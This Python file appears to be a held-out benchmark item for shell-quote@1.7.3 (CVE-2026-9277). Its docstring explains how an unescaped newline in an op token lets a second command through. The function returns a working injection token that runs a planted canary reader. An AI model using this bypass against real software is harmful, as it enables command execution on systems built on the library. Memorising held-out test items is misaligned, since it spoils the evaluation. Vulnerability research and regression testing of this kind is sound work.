#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-9277 residual exploit -- the incomplete-fix bypass of shell-quote@1.7.3.

CVE-2021-42740's 1.7.3 fix only tightened the STRING else-branch (`[A-z]` -> `[A-Za-z]`), closing the
backtick seed. But the SAME quote() function escapes OBJECT op-tokens with a DIFFERENT expression that was
left untouched:

    return s.op.replace(/(.)/g, '\\$1');     // per-character backslash-escape of the op string

In JavaScript, `.` in a regex does NOT match line terminators (\\n, \\r, U+2028, U+2029) unless the `s`
flag is set. So a NEWLINE inside an op string is NOT escaped and passes through verbatim. Supplying the
object token `{op: ';\\n/canary/rf'}` yields:

    echo ok \\;<NEWLINE>\\/canary\\/rf

The `\\;` is a literal semicolon, but the raw NEWLINE is a POSIX command separator: line 2 runs
`/canary/rf` (a planted no-arg reader that `cat /canary/flag.txt`) -> the flag appears in the output. This
reaches the flag on V1 (the CVE-2021-42740-patched version) = the residual / incomplete fix = CVE-2026-9277
(GHSA-w7jw-789q-3m8p). Note the injected line must be a SINGLE word: quote() backslash-escapes the space,
so a command WITH arguments would be glued into one token -- hence the reader takes no arguments.

On V2 (shell-quote@1.8.4, the CVE-2026-9277 fix) op-tokens are validated against an allowlist and line
terminators are rejected, so `quote([{op:';\\n/canary/rf'}])` THROWS a TypeError before any command is
built -> BLOCKED (negative control).
"""


def candidate():
    # `tokens` is a JSON array handed to the harness: here an OBJECT op-token whose newline is NOT escaped
    # by V1's `s.op.replace(/(.)/g, ...)` -> acts as a shell command separator.
    return {
        "tokens": [{"op": ";\n/canary/rf"}],
        "probe_id": "residual-cve-2026-9277-op-newline-line-terminator",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
